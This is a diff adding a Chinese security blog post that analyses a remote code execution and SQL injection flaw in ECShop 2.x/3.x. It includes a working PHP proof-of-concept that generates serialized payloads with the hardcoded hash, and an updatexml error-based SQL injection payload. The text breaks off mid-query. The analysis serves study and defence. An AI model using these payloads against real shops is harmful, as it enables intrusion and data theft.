@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ECShop 3.6.x RCE 漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="M13n&#39;s Blog">
+<meta property="og:description" content="两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175028636.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183225043.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183504327.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124184751849.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124185436789.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190021547.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190519184.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191853741.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191423906.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125153706202.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154151298.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154200642.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125192053092.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124221247588.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124225708206.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125194129600.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120549159.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125011036242.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120749172.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125124304197.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125125626867.png">
+<meta property="og:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125130011473.png">
+<meta property="article:published_time" content="2020-11-21T11:49:29.000Z">
+<meta property="article:modified_time" content="2021-02-11T11:59:04.374Z">
+<meta property="article:author" content="M13n">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SQLi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175028636.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ECShop 3.6.x RCE 漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&text=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&is_video=false&description=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ECShop 3.6.x RCE 漏洞分析&body=Check out this article: http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&name=ECShop 3.6.x RCE 漏洞分析&description=&lt;p&gt;两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&t=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#3-6-x-RCE"><span class="toc-number">1.</span> <span class="toc-text">3.6.x RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">触发流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%89%96%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">问题剖析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi%EF%BC%88%E4%BA%91%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">SQLi（云复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.2.4.</span> <span class="toc-text">RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-0-SQLi"><span class="toc-number">2.</span> <span class="toc-text">4.0 SQLi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ECShop 3.6.x RCE 漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M13n's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-21T11:49:29.000Z" itemprop="datePublished">2020-11-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PHP-Sec/">PHP Sec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SQLi/" rel="tag">SQLi</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习</p>
+<span id="more"></span>
+
+<p>近日笔者又看到了 4.0 版本的 SQL 注入漏洞分析，一个 nday 到 0day 挖掘的利用思路。本想连着一起复现分析，可是没有找到 4.0的安装包</p>
+<h1 id="3-6-x-RCE"><a href="#3-6-x-RCE" class="headerlink" title="3.6.x RCE"></a>3.6.x RCE</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Vulhub上已经有现成的利用脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$shell = bin2hex(<span class="string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);</span><br><span class="line">$<span class="built_in">id</span> = <span class="string">&quot;-1&#x27; UNION/*&quot;</span>;</span><br><span class="line">$arr = [</span><br><span class="line">    <span class="string">&quot;num&quot;</span> =&gt; sprintf(<span class="string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, bin2hex($<span class="built_in">id</span>), $shell),</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; $<span class="built_in">id</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$s = serialize($arr);</span><br><span class="line"></span><br><span class="line">$hash3 = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line">$hash2 = <span class="string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;&#123;$hash2&#125;ads|&#123;$s&#125;&#123;$hash2&#125;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;&#123;$hash3&#125;ads|&#123;$s&#125;&#123;$hash3&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175028636.png" alt="image-20201124175028636"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h3><p>定位触发点 <code>/user.php</code>：</p>
+<p>对 <code>$back_act</code> 附值， 其实这个地方相当于 <code>Referer</code>  字段不包含 <code>user.php</code> 的前提下能达到 <code>$back_act</code> 的变量可控</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png" alt="image-20201124175854342"></p>
+<p>变量传递</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183225043.png" alt="image-20201124183225043"></p>
+<p>跟进，这里进行了变量注册。将 <code>$back_act</code> 注册成了 <code>$this-&gt;_var[$tpl_var]</code></p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183504327.png" alt="image-20201124183504327"></p>
+<p>下面跟进 <code>display</code> ，<code>/includes/cls_template.php</code> 为模版类， <code>display</code> 为页面显示函数</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124184751849.png" alt="image-20201124184751849"></p>
+<p>跟进 <code>fetch</code>，主要为模版处理文件。处理的 <code>filename</code> 为 <code>user_passport.dwt</code></p>
+<p>其中这里会触发编译模版函数</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124185436789.png" alt="image-20201124185436789"></p>
+<p>跟进<code>make_compiled</code> , 会返回处理好的 hmtl 内容。然后附值给 <code>out</code></p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190021547.png" alt="image-20201124190021547"></p>
+<p>之后会返回 <code>display</code> 函数继续处理未处理的流程，<code>strpos</code> 判断这里是至关重要的一点，涉及到了之后需要调用的 <code>insert_mod</code> 。</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190519184.png" alt="image-20201124190519184"></p>
+<p><code>$this-&gt;_echash</code> 是之前 <code>/includes/cls_template.php</code> 定义好的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$_echash</span>        = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后进行 <code>foreach</code> 循环执行  <code>insert_mod</code> </p>
+<p>这里 <code>if (($key % 2) == 1)</code> 的作用看一下被切割的 <code>k</code> 就知道了</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191853741.png" alt="image-20201124191853741"></p>
+<p>跟进  <code>insert_mod</code>， 主要完成这几件事儿：</p>
+<ol>
+<li>用 <code>|</code> 分割变量</li>
+<li>反序列化 <code>para</code></li>
+<li><code>fun</code> 变量的拼接</li>
+<li>返回 <code> $fun($para)</code></li>
+</ol>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191423906.png" alt="image-20201124191423906"></p>
+<p>根据返回值引发思考， 我们目前得到的返回值是：<code>$fun($para)</code> </p>
+<p><code>$fun($para)</code> 的 <code>fun</code> 来自 <code>insert_</code> + 被 explode 的前半部分</p>
+<p><code>para</code> 来自被 explode 的后半部分</p>
+<p>那么漏洞利用思路就是执行拼接了  <code>insert_</code>  的可控函数</p>
+<h3 id="问题剖析"><a href="#问题剖析" class="headerlink" title="问题剖析"></a>问题剖析</h3><ul>
+<li>问题一</li>
+</ul>
+<p>首先是 <code>$back_act</code> 附值方式，为什么采用 Referer 头传入？</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png" alt="image-20201124175854342"></p>
+<p>其实还有很多其他附值方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">emample:</span><br><span class="line"><span class="variable">$back_act</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;back_act&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;back_act&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>究其核心原因：</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125153706202.png" alt="image-20201125153706202"></p>
+<p><code>/includes/init.php</code></p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154151298.png" alt="image-20201125154151298"></p>
+<p><code>addslashes_deep</code></p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154200642.png" alt="image-20201125154200642"></p>
+<hr>
+<ul>
+<li>问题二</li>
+</ul>
+<p>为什么字符串是序列化字符串？</p>
+<p><code>/includes/cls_template.php#insert_mod</code> 先分割，再反序列化</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125192053092.png" alt="image-20201125192053092"></p>
+<hr>
+<ul>
+<li>问题三</li>
+</ul>
+<p>如何bypass</p>
+<p>主要过滤</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smarty_prefilter_preCompile</span>(<span class="params"><span class="variable">$source</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">      ···</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$pattern</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;/&lt;!--[^&gt;|\n]*?(&#123;.+?&#125;)[^&lt;|&#123;|\n]*?--&gt;/&#x27;</span>, <span class="comment">// 替换smarty注释</span></span><br><span class="line">            <span class="string">&#x27;/&lt;!--[^&lt;|&gt;|&#123;|\n]*?--&gt;/&#x27;</span>,               <span class="comment">// 替换不换行的html注释</span></span><br><span class="line">            <span class="string">&#x27;/(href=[&quot;|\&#x27;])\.\.\/(.*?)([&quot;|\&#x27;])/i&#x27;</span>,  <span class="comment">// 替换相对链接</span></span><br><span class="line">            <span class="string">&#x27;/((?:background|src)\s*=\s*[&quot;|\&#x27;])(?:\.\/|\.\.\/)?(images\/.*?[&quot;|\&#x27;])/is&#x27;</span>, <span class="comment">// 在images前加上 $tmp_dir</span></span><br><span class="line">            <span class="string">&#x27;/((?:background|background-image):\s*?url\()(?:\.\/|\.\.\/)?(images\/)/is&#x27;</span>, <span class="comment">// 在images前加上 $tmp_dir</span></span><br><span class="line">            <span class="string">&#x27;/([\&#x27;|&quot;])\.\.\//is&#x27;</span>, <span class="comment">// 以../开头的路径全部修正为空</span></span><br><span class="line">            );</span><br><span class="line">        <span class="variable">$replace</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;\1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;\1\2\3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;\1&#x27;</span> . <span class="variable">$tmp_dir</span> . <span class="string">&#x27;\2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;\1&#x27;</span> . <span class="variable">$tmp_dir</span> . <span class="string">&#x27;\2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;\1&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replace</span>, <span class="variable">$source</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SQLi（云复现）"><a href="#SQLi（云复现）" class="headerlink" title="SQLi（云复现）"></a>SQLi（云复现）</h3><p>3.x版本引入了 <code>/includes/safety.php</code> 进行过滤。所以 3.x 版本 理论上是不存在 SQL 注入的</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124221247588.png" alt="image-20201124221247588"></p>
+<p>但是为了学习思路，还是云复现一下这个 2.x 版本可以利用的漏洞。</p>
+<p>之前分析到寻找可控函数进行调用。网上用的都是 <code>insert_ads</code> 这个函数</p>
+<p>关于 SQL 注入的利用思考可以参考这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2725">https://xz.aliyun.com/t/2725</a></p>
+<p>注释掉了 waf 相关的函数（绕不过去），payload 如下</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">45</span>ea207d7a2b68c49582d2d22adf953aads<span class="operator">|</span>a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:&quot;num&quot;;s:<span class="number">3</span>:&quot;669&quot;;s:<span class="number">2</span>:&quot;id&quot;;s:<span class="number">57</span>:&quot;1&#x27; and updatexml(1,make_set(3,&#x27;~&#x27;,(select version())),1)#&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行的相应 SQL 语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> `ecshop360`.`ecs_ad` <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> `ecshop360`.`ecs_ad_position` <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id <span class="operator">=</span> p.position_id <span class="keyword">WHERE</span> enabled <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> start_time <span class="operator">&lt;=</span> <span class="string">&#x27;1606229787&#x27;</span> <span class="keyword">AND</span> end_time <span class="operator">&gt;=</span> <span class="string">&#x27;1606229787&#x27;</span> <span class="keyword">AND</span> a.position_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(<span 